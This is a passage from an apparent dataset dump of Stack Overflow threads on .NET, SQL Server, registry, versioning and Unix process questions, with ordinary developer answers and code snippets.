to include the file that declares VideoPlayer, and still doesn't need to know about how you implemented it.\\n\", \"You should use an inner class only when you cannot implement it as a separate class using the would-be outer class' public interface.  Inner classes increase the size, complexity, and responsibility of a class so they should be used sparingly.\\n\\nYour encoder/decoder class sounds like it better fits the Strategy Pattern\\n\", 'One reason to avoid nested classes is if you ever intend to wrap the code with swig (http://www.swig.org) for use with other languages. Swig currently has problems with nested classes, so interfacing with libraries that expose any nested classes becomes a real pain.\\n', 'We hit an issue with a semi-old Sun C++ compiler and visibility of nested classes which behavior changed in the standard.  This is not a reason to not do your nested class, of course, just something to be aware of if you plan on compiling your software on lots of platforms including old compilers.\\n', 'Another thing to keep in mind is whether you ever envision different implementations of your work functions (such as decoding and encoding). In that case, you would definitely want an abstract base class with different concrete classes which implement the functions. It would not really be appropriate to nest a separate subclass for each type of implementation.\\n', \"Well, if you use pointers to your workhorse classes in your Interface class and don't expose them as parameters or return types in your interface methods, you will not need to include the definitions for those work horses in your interface header file (you just forward declare them instead). That way, users of your interface will not need to know about the classes in the background. \\n\\nYou definitely don't need to nest classes for this. In fact, separate class files will actually make your code a lot more readable and easier to manage as your project grows. it will also help you later on if you need to subclass (say for different content/codec types).\\n\\nHere's more information on the PIMPL pattern (section 3.1.1).\\n\"], [\"I've been writing a few web services for a .net app, now I'm ready to consume them. I've seen numerous examples where there is homegrown code for consuming the service as opposed to using the auto generated methods Visual Studio creates when adding the web reference. \\n\\nIs there some advantage to this?\\n\", \"No, what you're doing is fine. Don't let those people confuse you.\\r\\n\\r\\nIf you've written the web services with .net then the reference proxies generated by .net are going to be quite suitable. The situation you describe (where you are both producer and consumer) is the ideal situation.\\r\\n\\r\\nIf you need to connect to a web services that is unknown at compile time, then you would want a more dynamic approach, where you deduce the 'shape' of the web service. \\r\\n\\r\\nBut start by using the auto generated proxy class, and don't worry about it until you hit a limitation. And when you do -- come back to stack overflow ;-)\"], ['I wonder how you guys manage deployment of a database between 2 SQL Servers, specifically SQL Server 2005.\\nNow, there is a development and a live one. As this should be part of a buildscript (standard windows batch, even do with current complexity of those scripts, i might switch to PowerShell or so later), Enterprise Manager/Management Studio Express do not count.\\n\\nWould you just copy the .mdf File and attach it? I am always a bit careful when working with binary data, as this seems to be a compatiblity issue (even though development and live should run the same version of the server at all time).\\n\\nOr - given the lack of \"EXPLAIN CREATE TABLE\" in T-SQL - do you do something that exports an existing database into SQL-Scripts which you can run on the target server? If yes, is there a tool that can automatically dump a given Database into SQL Queries and that runs off the command line? (Again, Enterprise Manager/Management Studio Express do not count).\\n\\nAnd lastly - given the fact that the live database already contains data, the deployment may not involve creating all tables but rather checking the difference in structure and ALTER TABLE the live ones instead, which may also need data verification/conversion when existing fields change.\\n\\nNow, i hear a lot of great stuff about the Red Gate products, but for hobby projects, the price is a bit steep.\\n\\nSo, what are you using to automatically deploy SQL Server Databases from Test to Live?\\n', \"For my projects I alternate between SQL Compare from REd Gate and the Database Publishing Wizard from Microsoft which you can download free\\r\\nhere.\\r\\n\\r\\nThe Wizard isn't as slick as SQL Compare or SQL Data Compare but it does the trick. One issue is that the scripts it generates may need some rearranging and/or editing to flow in one shot.\\r\\n\\r\\nOn the up side, it can move your schema and data which isn't bad for a free tool.\", \"I've taken to hand-coding all of my DDL (creates/alter/delete) statements, adding them to my .sln as text files, and using normal versioning (using subversion, but any revision control should work). This way, I not only get the benefit of versioning, but updating live from dev/stage is the same process for code and database - tags, branches and so on work all the same.\\r\\n\\r\\nOtherwise, I agree redgate is expensive if you don't have a company buying it for you. If you can get a company to buy it for you though, it really is worth it!\", \"If you have a company buying it, Toad from Quest Software has this kind of management functionality built in.  It's basically a two-click operation to compare two schemas and generate a sync script from one to the other.\\r\\n\\r\\nThey have editions for most of the popular databases, including of course Sql Server.\", \"I work the same way Karl does, by keeping all of my SQL scripts for creating and altering tables in a text file that I keep in source control.  In fact, to avoid the problem of having to have a script examine the live database to determine what ALTERs to run, I usually work like this:\\r\\n\\r\\n\\r\\nOn the first version, I place everything during testing into one SQL script, and treat all tables as a CREATE.  This means I end up dropping and readding tables a lot during testing, but that's not a big deal early into the project (since I'm usually hacking the data I'm using at that point anyway).\\r\\nOn all subsequent versions, I do two things: I make a new text file to hold the upgrade SQL scripts, that contain just the ALTERs for that version.  And I make the changes to the original, create a fresh database script as well.  This way an upgrade just runs the upgrade script, but if we have to recreate the DB we don't need to run 100 scripts to get there.\\r\\nDepending on how I'm deploying the DB changes, I'll also usually put a version table in the DB that holds the version of the DB.  Then, rather than make any human decisions about which scripts to run, whatever code I have running the create/upgrade scripts uses the version to determine what to run.\\r\\n\\r\\n\\r\\nThe one thing this will not do is help if part of what you're moving from test to production is data, but if you want to manage structure and not pay for a nice, but expensive DB management package, is really not very difficult.  I've also found it's a pretty good way of keeping mental track of your DB.\", \"I agree that scripting everything is the best way to go and is what I advocate at work.  You should script everything from DB and object creation to populating your lookup tables.\\r\\n\\r\\nAnything you do in UI only won't translate (especially for changes... not so much for first deployments) and will end up requiring a tools like what Redgate offers.\", 'Using SMO/DMO, it isn\\'t too difficult to generate a script of your schema.  Data is a little more fun, but still doable.\\r\\n\\r\\nIn general, I take \"Script It\" approach, but you might want to consider something along these lines:\\r\\n\\r\\n\\r\\nDistinguish between Development and Staging, such that you can Develop with a subset of data ... this I would create a tool to simply pull down some production data, or generate fake data where security is concerned.\\r\\nFor team development, each change to the database will have to be coordinated amongst your team members.  Schema and data changes can be intermingled, but a single script should enable a given feature.  Once all your features are ready, you bundle these up in a single SQL file and run that against a restore of production.\\r\\nOnce your staging has cleared acceptance, you run the single SQL file again on the production machine.\\r\\n\\r\\n\\r\\nI have used the Red Gate tools and they are great tools, but if you can\\'t afford it, building the tools and working this way isn\\'t too far from the ideal.', \"Like Rob Allen, I use SQL Compare / Data Compare by Redgate. I also use the Database publishing wizard by Microsoft. I also have a console app I wrote in C# that takes a sql script and runs it on a server. This way you can run large scripts with 'GO' commands in it from a command line or in a batch script.\\n\\nI use Microsoft.SqlServer.BatchParser.dll and Microsoft.SqlServer.ConnectionInfo.dll libraries in the console application.\\n\", \"I agree with keeping everything in source control and manually scripting all changes.  Changes to the schema for a single release go into a script file created specifically for that release.  All stored procs, views, etc should go into individual files and treated just like .cs or .aspx as far as source control goes.  I use a powershell script to generate one big .sql file for updating the programmability stuff.\\n\\nI don't like automating the application of schema changes, like new tables, new columns, etc.  When doing a production release, I like to go through the change script command by command to make sure each one works as expected.  There's nothing worse than running a big change script on production and getting errors because you forgot some little detail that didn't present itself in development.\\n\\nI have also learned that indexes need to be treated just like code files and put into source control.\\n\\nAnd you should definitely have more than 2 databases - dev and live.  You should have a dev database that everybody uses for daily dev tasks.  Then a staging database that mimics production and is used to do your integration testing.  Then maybe a complete recent copy of production (restored from a full backup), if that is feasible, so your last round of installation testing goes against something that is as close to the real thing as possible.\\n\", \"Don't forget Microsoft's solution to the problem: Visual Studio 2008 Database Edition.  Includes tools for deploying changes to databases, producing a diff between databases for schema and/or data changes, unit tests, test data generation.\\n\\nIt's pretty expensive but I used the trial edition for a while and thought it was brilliant.  It makes the database as easy to work with as any other piece of code.\\n\", \"I do all my database creation as DDL and then wrap that DDL into a schema maintainence class. I may do various things to create the DDL in the first place but fundamentally I do all the schema maint in code. This also means that if one needs to do non DDL things that don't map well to SQL you can write procedural logic and run it between lumps of DDL/DML.\\n\\nMy dbs then have a table which defines the current version so one can code a relatively straightforward set of tests:\\n\\n\\nDoes the DB exist? If not create it.\\nIs the DB the current version? If not then run the methods, in sequence, that bring the schema up to date (you may want to prompt the user to confirm and - ideally - do backups at this point).\\n\\n\\nFor a single user app I just run this in place, for a web app we currently to lock the user out if the versions don't match and have a stand alone schema maint app we run. For multi-user it will depend on the particular environment.\\n\\nThe advantage? Well I have a very high level of confidence that the schema for the apps that use this methodology is consistent across all instances of those applications. Its not perfect, there are issues, but it works...\\n\\nThere are some issues when developing in a team environment but that's more or less a given anyway!\\n\\nMurph\\n\", \"I'm using Subsonic's migrations mechanism so I just have a dll with classes in squential order that have 2 methods, up and down. There is a continuous integration/build script hook into nant, so that I can automate the upgrading of my database.\\n\\nIts not the best thign in the world, but it beats writing DDL.\\n\", 'RedGate SqlCompare is a way to go in my opinion. We do DB deployment on a regular basis and since I started using that tool I have never looked back. \\nVery intuitive interface and saves a lot of time in the end.\\n\\nThe Pro version will take care of scripting for the source control integration as well.\\n', \"I'm currently working the same thing to you. Not only deploying SQL Server databases from test to live but also include the whole process from Local -> Integration -> Test -> Production. So what can make me easily everyday is I do NAnt task with Red-Gate SQL Compare. I'm not working for RedGate but I have to say it is good choice.\\n\", \"I also maintain scripts for all my objects and data. For deploying I wrote this free utility - http://www.sqldart.com. It'll let you reorder your script files and will run the whole lot within a transaction.\\n\"], [\"I would like the version property of my application to be incremented for each build but I'm not sure on how to enable this functionality in Visual Studio (2005/2008). I have tried to specify the AssemblyVersion as 1.0.* but it doesn't get me exactly what I want. \\r\\n\\r\\nI'm also using a settings file and in earlier attempts when the assembly version changed my settings got reset to the default since the application looked for the settings file in another directory. \\r\\n\\r\\nI would like to be able to display a version number in the form of 1.1.38 so when a user finds a problem I can log the version they are using as well as tell them to upgrade if they have an old release.\\r\\n\\r\\nA short explanation of how the versioning works would also be appreciated. When does the build and revision number get incremented?\", 'With the \"Built in\" stuff, you can\\'t, as using 1.0.* or 1.0.0.* will replace the revision and build numbers with a coded date/timestamp, which is usually also a good way. \\n\\nFor more info, see the Assembly Linker Documentation in the /v tag.\\n\\nAs for automatically incrementing numbers, use the AssemblyInfo Task:\\n\\nAssemblyInfo Task\\n\\nThis can be configured to automatically increment the build number.\\n\\nThere are 2 Gotchas:\\n\\n\\nEach of the 4 numbers in the Version string is limited to 65535. This is a Windows Limitation and unlikely to get fixed.\\n\\nWhy are build numbers limited to 65535?\\n\\nUsing with with Subversion requires a small change:\\n\\nUsing MSBuild to generate assembly version info at build time (including SubVersion fix)\\n\\n\\n\\nRetrieving the Version number is then quite easy:\\n\\nVersion v = Assembly.GetExecutingAssembly().GetName().Version;\\nstring About = string.Format(CultureInfo.InvariantCulture, @\"YourApp Version {0}.{1}.{2} (r{3})\", v.Major, v.Minor, v.Build, v.Revision);\\n\\n\\n\\n\\nAnd, to clarify: In .net or at least in C#, the build is actually the THIRD number, not the fourth one as some people (for example Delphi Developers who are used to Major.Minor.Release.Build) might expect.\\n\\nIn .net, it\\'s Major.Minor.Build.Revision.\\n', 'What source control system are you using? \\r\\n\\r\\nAlmost all of them have some form of $ Id $ tag that gets expanded when the file is checked in.\\r\\n\\r\\nI usually use some form of hackery to display this as the version number.\\r\\n\\r\\nThe other alternative is use to use the date as the build number: 080803-1448', \"Some time ago I wrote a quick and dirty exe that would update the version #'s in an assemblyinfo.{cs/vb} - I also have used rxfind.exe (a simple and powerful regex-based search replace tool) to do the update from a command line as part of the build process.  A couple of other helpfule hints:\\r\\n\\r\\n\\r\\nseparate the assemblyinfo into product parts (company name, version, etc.) and assembly specific parts (assembly name etc.).  See here\\r\\nAlso - i use subversion, so I found it helpful to set the build number to subversion revision number thereby making it really easy to always get back to the codebase that generated the assembly (e.g. 1.4.100.1502 was built from revision 1502).\\r\\n\", 'VS.NET defaults the Assembly version to 1.0.* and uses the following logic when auto-incrementing: it sets the build part to the number of days since January 1st, 2000, and sets the revision part to the number of seconds since midnight, local time, divided by two. See this MSDN article.\\n\\nAssembly version is located in an assemblyinfo.vb or assemblyinfo.cs file. From the file: \\n\\n\\' Version information for an assembly consists of the following four values:\\n\\'\\n\\'      Major Version\\n\\'      Minor Version \\n\\'      Build Number\\n\\'      Revision\\n\\'\\n\\' You can specify all the values or you can default the Build and Revision Numbers \\n\\' by using the \\'*\\' as shown below:\\n\\' &lt;Assembly: AssemblyVersion(\"1.0.*\")&gt; \\n\\n&lt;Assembly: AssemblyVersion(\"1.0.0.0\")&gt; \\n&lt;Assembly: AssemblyFileVersion(\"1.0.0.0\")&gt; \\n\\n', 'If you want an auto incrementing number that updates each time a compilation is done, you can use VersionUpdater from a pre-build event. Your pre-build event can check the build configuration if you prefer so that the version number will only increment for a Release build (for example).\\n', 'I have found that it works well to simply display the date of the last build using the following wherever a product version is needed:\\n\\nSystem.IO.File.GetLastWriteTime(System.Reflection.Assembly.GetExecutingAssembly().Location).ToString(\"yyyy.MM.dd.HHMM\")\\n\\n\\nRather than attempting to get the version from something like the following:\\n\\nSystem.Reflection.Assembly assembly = System.Reflection.Assembly.GetExecutingAssembly();\\nobject[] attributes = assembly.GetCustomAttributes(typeof(System.Reflection.AssemblyFileVersionAttribute), false);\\nobject attribute = null;\\n\\nif (attributes.Length &gt; 0)\\n{\\n    attribute = attributes[0] as System.Reflection.AssemblyFileVersionAttribute;\\n}\\n\\n'], [\"I'm trying to maintain a Setup Project in Visual Studio 2003 (yes, it's a legacy application). The problem we have at the moment is that we need to write registry entries to HKCU for every user on the computer. They need to be in the HKCU rather than HKLM because they are the default user settings, and they do change per user. My feeling is that\\n\\n\\nThis isn't possible\\nThis isn't something the installer should be doing, but something the application should be doing (after all what happens when a user profile is created after the install?).\\n\\n\\nWith that in mind, I still want to change as little as possible in the application, so my question is, is it possible to add registry entries for every user in a Visual Studio 2003 setup project? \\n\\nAnd, at the moment the project lists five registry root keys (HKEY_CLASSES_ROOT, HKEY_CURRENT_USER, HKEY_LOCAL_MACHINE, HKEY_USERS, and User/Machine Hive). I don't really know anything about the Users root key, and haven't seen User/Machine Hive. Can anyone enlighten me on what they are? Perhaps they could solve my problem above.\\n\", 'I\\'m partway to my solution with this entry on MSDN (don\\'t know how I couldn\\'t find it before).\\n\\nUser/Machine Hive\\nSubkeys and values entered under this hive will be installed under the HKEY_CURRENT_USER hive when a user chooses \"Just Me\" or the HKEY_USERS hive or when a user chooses \"Everyone\" during installation.\\n\\nRegistry Editor\\n', 'First: Yes, this is something that belongs in the Application for the exact reson you specified: What happens after new user profiles are created? Sure, if you\\'re using a domain it\\'s possible to have some stuff put in the registry on creation, but this is not really a use case. The Application should check if there are seetings and use the default settings if not.\\r\\n\\r\\nThat being said, it IS possible to change other users Keys through the HKEY_USERS Hive.\\r\\n\\r\\nI have no experience with the Visual Studio 2003 Setup Project, so here is a bit of (totally unrelated) VBScript code that might just give you an idea where to look:\\r\\n\\r\\nconst HKEY_USERS = &amp;H80000003strComputer = \".\"Set objReg=GetObject(\"winmgmts:{impersonationLevel=impersonate}!\\\\\\\\\" &amp; strComputer &amp; \"\\\\root\\\\default:StdRegProv\")strKeyPath = \"\"objReg.EnumKey HKEY_USERS, strKeyPath, arrSubKeysstrKeyPath = \"\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\WinTrust\\\\Trust Providers\\\\Software Publishing\"For Each subkey In arrSubKeys    objReg.SetDWORDValue HKEY_USERS, subkey &amp; strKeyPath, \"State\", 146944Next\\r\\n\\r\\n(Code Courtesy of Jeroen Ritmeijer)', \"I'm guessing that because you want to set it for all users, that you're on some kind of shared computer, which is probably running under a domain?\\r\\n\\r\\nHERE BE DRAGONS\\r\\n\\r\\nLet's say Joe and Jane regularly log onto the computer, then they will each have 'registries'.\\r\\n\\r\\nYou'll then install your app, and the installer will employ giant hacks and disgusting things to set items under HKCU for them.\\r\\n\\r\\nTHEN, bob will come along and log on (he, and 500 other people have accounts in the domain and so can do this). He's never used this computer before, so he has no registry. The first time he logs in, windows creates him one, but he won't have your setting. \\r\\n\\r\\nYour app then falls over or behaves incorrectly, and bob complains loudly about those crappy products from raynixon incorporated.\\r\\n\\r\\nThe correct answer is to just have some default settings in your app, which can write them to the registry if it doesn't find them. It's general good practice that your app should never depend on the registry, and should create things as needed, for any registry entry, not just HKCU, anyway\", \"Despite what the MSDN article  says about User/Machine Hive, it doesn't write to HKEY_USERS. Rather it writes to HKCU if you select Just Me and HKLM if you select Everyone.\\r\\n\\r\\nSo my solution is going to be to use the User/Machine Hive, and then in the application it checks if the registry entries are in HKCU and if not, copies them from HKLM. I know this probably isn't the most ideal way of doing it, but it has the least amount of changes.\"], [\"What's the simplest way to connect and query a database for a set of records in C#?\\n\", 'Very roughly and from memory since I don\\'t have code on this laptop:\\n\\nusing (OleDBConnection conn = new OleDbConnection())\\n{\\n  conn.ConnectionString = \"Whatever connection string\";\\n\\n  using (OleDbCommand cmd = new OleDbCommand())\\n  {\\n    cmd.Connection = conn;\\n    cmd.CommandText = \"Select * from CoolTable\";\\n\\n    using (OleDbDataReader dr = cmd.ExecuteReader())\\n    {\\n      while (dr.Read())\\n      {\\n        // do something like Console.WriteLine(dr[\"column name\"] as String);\\n      }\\n    }\\n  }\\n}\\n\\n', '@Goyuix -- that\\'s excellent for something written from memory.\\ntested it here -- found the connection wasn\\'t opened. Otherwise very nice.\\n\\nusing System.Data.OleDb;\\n...\\n\\nusing (OleDbConnection conn = new OleDbConnection())\\n{\\n    conn.ConnectionString = \"Provider=sqloledb;Data Source=yourServername\\\\\\\\yourInstance;Initial Catalog=databaseName;Integrated Security=SSPI;\";\\n\\n    using (OleDbCommand cmd = new OleDbCommand())\\n    {\\n        conn.Open();\\n        cmd.Connection = conn;\\n        cmd.CommandText = \"Select * from yourTable\";\\n\\n        using (OleDbDataReader dr = cmd.ExecuteReader())\\n        {\\n            while (dr.Read())\\n            {\\n                Console.WriteLine(dr[\"columnName\"]);\\n            }\\n        }\\n    }\\n}\\n\\n', 'That\\'s definitely a good way to do it.  But you if you happen to be using a database that supports LINQ to SQL, it can be a lot more fun.  It can look something like this:\\r\\n\\r\\nMyDB db = new MyDB(\"Data Source=...\");var q = from db.MyTable        select c;foreach (var c in q)  Console.WriteLine(c.MyField.ToString());', 'This is an alternative way (DataReader is faster than this one):\\r\\n\\r\\nstring s = \"\";SqlConnection conn = new SqlConnection(\"Server=192.168.1.1;Database=master;Connect Timeout=30;User ID=foobar;Password=raboof;\");SqlDataAdapter da = new SqlDataAdapter(\"SELECT TOP 5 name, dbid FROM sysdatabases\", conn);DataTable dt = new DataTable();da.Fill(dt);for (int i = 0; i &lt; dt.Rows.Count; i++){    s += dt.Rows[i][\"name\"].ToString() + \" -- \" + dt.Rows[i][\"dbid\"].ToString() + \"\\\\n\";}MessageBox.Show(s);', \"If you are querying a SQL Server database (Version 7 and up) you should replace the OleDb classes with corresponding classes in the System.Data.SqlClient namespace (SqlConnection, SqlCommand and SqlDataReader) as those classes have been optimized to work with SQL Server.\\n\\nAnother thing to note is that you should 'never' select all as this might lead to unexpected results later on if you add or remove columns to this table.\\n\", 'If you are intending on reading a large number of columns or records it\\'s also worth caching the ordinals and accessing the strongly-typed methods, e.g.\\n\\nusing (DbDataReader dr = cmd.ExecuteReader()) {\\n  if (dr.Read()) {\\n    int idxColumnName = dr.GetOrdinal(\"columnName\");\\n    int idxSomethingElse = dr.GetOrdinal(\"somethingElse\");\\n\\n    do {\\n      Console.WriteLine(dr.GetString(idxColumnName));\\n      Console.WriteLine(dr.GetInt32(idxSomethingElse));\\n    } while (dr.Read());\\n  }\\n}\\n\\n', 'I guess, you can try entity framework.\\n\\nusing (SchoolDBEntities ctx = new SchoolDBEntities())\\n{\\n     IList&lt;Course&gt; courseList = ctx.GetCoursesByStudentId(1).ToList&lt;Course&gt;();\\n     //do something with courselist here\\n}\\n\\n'], ['I need to grab the base64-encoded representation of the ViewState. Obviously this would not be available until fairly late in the request lifecycle, which is OK.\\n\\nFor example, if the output of the page includes:\\n\\n&lt;input type=\"hidden\" name=\"__VIEWSTATE\" \\n  id=\"__VIEWSTATE\" value=\"/wEPDwUJODU0Njc5MD...==\" /&gt;\\n\\n\\nI need a way on the server side to get the value \"/wEPDwUJODU0Njc5MD...==\"\\n\\nTo clarify, I need this value when the page is being rendered, not on PostBack. e.g. I need to know the ViewState value that is being sent to the client, not the ViewState I\\'m getting back from them.\\n', \"Rex, I suspect a good place to start looking is solutions that compress the ViewState -- they're grabbing ViewState on the server before it's sent down to the client and gzipping it. That's exactly where you want to be.\\r\\n\\r\\n\\r\\nScott Hanselman on ViewState Compression (2005)\\r\\nViewState Compression with System.IO.Compression (2007)\\r\\n\", 'See this blog post where the author describes a method for overriding the default behavior for generating the ViewState and instead shows how to save it on the server Session object.\\r\\n\\r\\n\\r\\n  In ASP.NET 2.0, ViewState is saved by\\r\\n  a descendant of PageStatePersister\\r\\n  class. This class is an abstract class\\r\\n  for saving and loading ViewsState and\\r\\n  there are two implemented descendants\\r\\n  of this class in .Net Framework, named\\r\\n  HiddenFieldPageStatePersister and\\r\\n  SessionPageStatePersister. By default\\r\\n  HiddenFieldPageStatePersister is used\\r\\n  to save/load ViewState information,\\r\\n  but we can easily get the\\r\\n  SessionPageStatePersister to work and\\r\\n  save ViewState in Session object.\\r\\n\\r\\n\\r\\nAlthough I did not test his code, it seems to show exactly what you want: a way to gain access to ViewState code while still on the server, before postback. ', 'I enabled compression following similar articles to those posted above. The key to accessing the ViewState before the application sends it was overriding this method;\\r\\n\\r\\nprotected override void SavePageStateToPersistenceMedium(object viewState)\\r\\n\\r\\nYou can call the base method within this override and then add whatever additional logic you require to handle the ViewState.'], [\"I'm looking for a way to delete a file which is locked by another process using C#. I suspect the method must be able to find which process is locking the file (perhaps by tracking the handles, although I'm not sure how to do this in C#) then close that process before being able to complete the file delete using File.Delete().\\n\", 'You can use this program, Handle, to find which process has the lock on your file. It\\'s a command-line tool, so I guess you use the output from that... I\\'m not sure about finding it programmatically.\\n\\nIf deleting the file can wait, you could specify it for deletion when your computer next starts up:\\n\\n\\nStart REGEDT32 (W2K) or REGEDIT (WXP) and navigate to:\\n\\nHKEY_LOCAL_MACHINE\\\\System\\\\CurrentControlSet\\\\Control\\\\Session Manager\\n\\nW2K and WXP\\n\\n\\nW2K:EditAdd Value...Data Type: REG_MULTI_SZValue Name: PendingFileRenameOperationsOK\\nWXP:EditNewMulti-String Valueenter\\nPendingFileRenameOperations\\n\\nIn the Data area, enter \"\\\\??\\\\\" + filename to be deleted. LFNs may\\nbe entered without being embedded in quotes. To delete C:\\\\Long Directory Name\\\\Long File Name.exe, enter the following data:\\n\\n\\\\??\\\\C:\\\\Long Directory Name\\\\Long File Name.exe\\n\\n\\nThen press OK.\\nThe \"destination file name\" is a null (zero) string. It is entered\\nas follows:\\n\\n\\nW2K:EditBinaryselect Data Format: Hexclick at the end of the hex stringenter 0000 (four zeros)OK\\nWXP:Right-click the valuechoose \"Modify Binary Data\"click at the end of the hex stringenter 0000 (four zeros)OK\\n\\nClose REGEDT32/REGEDIT and reboot to delete the file.\\n\\n\\n(Shamelessly stolen from some random forum, for posterity\\'s sake.)\\n', \"Killing other processes is not a healthy thing to do. If your scenario involves something like uninstallation, you could use the MoveFileEx API function to mark the file for deletion upon next reboot.\\n\\nIf it appears that you really need to delete a file in use by another process, I'd recommend re-considering the actual problem before considering any solutions.\\n\", \"If you want to do it programatically. I'm not sure... and I'd really recommend against it.\\r\\nIf you're just troubleshooting stuff on your own machine, SysInternals Process Explorer can help you\\r\\n\\r\\nRun it, use the Find Handle command (I think it's either in the find or handle menu), and search for the name of your file. Once the handle(s) is found, you can forcibly close them.\\r\\n\\r\\nYou can then delete the file and so on.\\r\\n\\r\\nBeware, doing this may cause the program which owns the handles to behave strangely, as you've just pulled the proverbial rug out from under it, but it works well when you are debugging your own errant code, or when visual studio / windows explorer is being crap and not releasing file handles even though you told them to close the file ages ago... sigh :-)\", \"Oh, one big hack I employed years ago, is that Windows won't let you delete files, but it does let you move them.\\n\\nPseudo-sort-of-code:\\n\\nmv %WINDIR%\\\\System32\\\\mfc42.dll %WINDIR\\\\System32\\\\mfc42.dll.old\\nInstall new mfc42.dll\\nTell user to save work and restart applications\\n\\n\\nWhen the applications restarted (note we didn't need to reboot the machine), they loaded the new mfc42.dll, and all was well. That, coupled with PendingFileOperations to delete the old one the next time the whole system restarted, worked pretty well.\\n\", 'The typical method is as follows. You\\'ve said you want to do this in C# so here goes...\\r\\n\\r\\nIf you don\\'t know which process has the file locked, you\\'ll need to examine each process\\'s handle list, and query each handle to determine if it identifies the locked file. Doing this in C# will likely require P/Invoke or an intermediary C++/CLI to call the native APIs you\\'ll need.\\r\\nOnce you\\'ve figured out which process(es) have the file locked, you\\'ll need to safely inject a small native DLL into the process (you can also inject a managed DLL, but this is messier, as you then have to start or attach to the .NET runtime).\\r\\nThat bootstrap DLL then closes the handle using CloseHandle etc.\\r\\nEssentially: the way to unlock a \"locked\" file is to inject a DLL into the offending process\\'s address space and close it yourself. You can do this using native or managed code. No matter what, you\\'re going to need a small amount of native code or at least P/Invoke into the same.\\r\\nHelpful links:\\r\\n\\r\\nhttp://www.codeproject.com/KB/threads/winspy.aspx\\r\\nhttp://damianblog.com/2008/07/02/net-code-injection/\\r\\nGood luck!', 'This looks promising. A way of killing the file handle....\\n\\nhttp://www.timstall.com/2009/02/killing-file-handles-but-not-process.html\\n', 'Using Orion Edwards advice I downloaded the SysInternals Process Explorer which in turn allowed me to discover that the file I was havind difficulties deleting was in fact being held not by the Excel.Applications object I thought but rather the fact that my C# code send mail code had created an Attachment object that left a handle to this file open.\\n\\nOnce I saw this, I quite simple called on the dispose method of the Attachment object, and the handle was released.\\n\\nthe Sys Internals explorer allowed me to discover this used in conjuction with the VS2005 debugger.\\n\\nI highly recommend this tool!\\n'], ['What is the correct way to get the process size on Solaris, HP-UX and AIX? Should we use top or ps -o vsz or something else?\\n', 'Yes, you are right to lock at the VSZ.\\n\\nps u will give you the VSZ and RSS, which are the virtual memory size and resident set size.  The RSS is how much physical memory has been allocated to the process, and the VSZ is the virtual memory size of the process.  If you have several copies of a program running, a lot of the memory in the VSZ will be shared between those processes.\\n', 'The exact definitions of \"vsize,\" \"rss,\" \"rprvt,\" \"rshrd,\" and other obscure-looking abbreviations vary from OS to OS.  The manual pages for the \"top\" and \"ps\" commands will have some sort of description, but all such descriptions are simplified greatly (or are based on long-extinct kernel implementations).  \"Process size\" as a concept is fiendishly difficult to pin down in the general case.  Answers in specific instances depend heavily on the actual memory management implementation in the OS, and are rarely as satisfying as the tidy \"process size\" concept that exists in the minds of most users (and most developers).\\r\\n\\r\\nFor example, none of those numbers (nor, likely, any combination of them) can be used to tell you exactly how many such processes can run at once in a given amount of free memory.  But really, your best bet is to come at it from that end: why do you want this number, and what will you use it for?  Given that information, I think you\\'ll get more useful answers.', 'On Solaris, you can get detailed information on a process\\'s memory usage with the pmap command. In particular, pmap -x &lt;pid&gt; shows you how much of a process\\'s memory is shared and how much is specifically used by that process. This is useful for working out the \"marginal\" memory usage of a process -- with this technique you can avoid double-counting shared libraries.\\n', \"I summed up the resident set size for all processes like this (as root):\\n\\nps ax -o rss | awk '{rss += $1;} END { print rss}'\\n\\n\"], [\"I am using CCNET on a sample project with SVN as my source control. CCNET is configured to create a build on every check in. CCNET uses MSBuild to build the source code.\\r\\n\\r\\nI would like to use the latest revision number to generate AssemblyInfo.cs while compiling.\\r\\nHow can I retrieve the latest revision from subversion and use the value in CCNET?\\r\\n\\r\\nEdit: I'm not using NAnt - only MSBuild.\", 'I am currently \"manually\" doing it through a prebuild-exec Task, using my cmdnetsvnrev tool, but if someone knows a better ccnet-integrated way of doing it, i\\'d be happy to hear :-)', \"I found this project on google code. This is CCNET plugin to generate the label in CCNET.\\n\\nThe DLL is tested with CCNET 1.3 but it works with CCNET 1.4 for me. I'm successfully using this plugin to label my build.\\n\\nNow onto passing it to MSBuild...\\n\", 'You have basically two options. Either you write a simple script that will start and parse output from\\n\\nsvn.exe info --revision HEAD\\n\\nto obtain revision number (then generating AssemblyInfo.cs is pretty much straight forward) or just use plugin for CCNET. Here it is:\\n\\n\\n  SVN Revision Labeller is a plugin for\\n  CruiseControl.NET that allows you to\\n  generate CruiseControl labels for your\\n  builds, based upon the revision number\\n  of your Subversion working copy. This\\n  can be customised with a prefix and/or\\n  major/minor version numbers.\\n  \\n  http://code.google.com/p/svnrevisionlabeller/\\n\\n\\nI prefer the first option because it\\'s only roughly 20 lines of code:\\n\\nusing System;\\nusing System.Diagnostics;\\n\\nnamespace SvnRevisionNumberParserSample\\n{\\n    class Program\\n    {\\n        static void Main()\\n        {\\n            Process p = Process.Start(new ProcessStartInfo()\\n                {\\n                    FileName = @\"C:\\\\Program Files\\\\SlikSvn\\\\bin\\\\svn.exe\", // path to your svn.exe\\n                    UseShellExecute = false,\\n                    RedirectStandardOutput = true,\\n                    Arguments = \"info --revision HEAD\",\\n                    WorkingDirectory = @\"C:\\\\MyProject\" // path to your svn working copy\\n                });\\n\\n            // command \"svn.exe info --revision HEAD\" will produce a few lines of output\\n            p.WaitForExit();\\n\\n            // our line starts with \"Revision: \"\\n            while (!p.StandardOutput.EndOfStream)\\n            {\\n                string line = p.StandardOutput.ReadLine();\\n                if (line.StartsWith(\"Revision: \"))\\n                {\\n                    string revision = line.Substring(\"Revision: \".Length);\\n                    Console.WriteLine(revision); // show revision number on screen                       \\n                    break;\\n                }\\n            }\\n\\n            Console.Read();\\n        }\\n    }\\n}\\n\\n', \"If you prefer doing it on the MSBuild side over the CCNet config, looks like the MSBuild Community Tasks extension's SvnVersion task might do the trick.\\n\", '\\r\\n  Customizing csproj files to autogenerate AssemblyInfo.cs \\r\\n  http://www.codeproject.com/KB/dotnet/Customizing_csproj_files.aspx\\r\\n  \\r\\n  Every time we create a new C# project,\\r\\n  Visual Studio puts there the\\r\\n  AssemblyInfo.cs file for us. The file\\r\\n  defines the assembly meta-data like\\r\\n  its version, configuration, or\\r\\n  producer.\\r\\n\\r\\n\\r\\nFound the above technique to auto-gen AssemblyInfo.cs using MSBuild. Will post sample shortly.', 'I have written a NAnt build file that handles parsing SVN information and creating properties. I then use those property values for a variety of build tasks, including setting the label on the build. I use this target combined with the SVN Revision Labeller mentioned by lubos hasko with great results.\\r\\n\\r\\n&lt;target 